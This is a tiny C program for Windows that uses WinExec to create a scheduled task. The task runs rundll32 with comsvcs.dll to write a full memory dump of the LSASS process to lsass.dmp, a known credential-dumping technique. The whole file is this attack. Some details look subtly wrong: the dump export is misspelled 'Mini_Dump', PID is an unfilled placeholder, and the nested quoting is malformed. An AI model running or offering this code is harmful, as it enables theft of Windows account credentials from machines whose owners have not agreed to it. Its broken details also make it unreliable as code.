#include <windows.h>

#define RUN(toRun) WinExec("schtasks /create /tn MyTask /tr \"cmd.exe /c \"" toRun "\" /sc once /st 00:00", SW_SHOW);

int main() {
    RUN("rundll32.exe C:\\Windows\\System32\\comsvcs.dll Mini_Dump PID lsass.dmp full");
    return 0;
}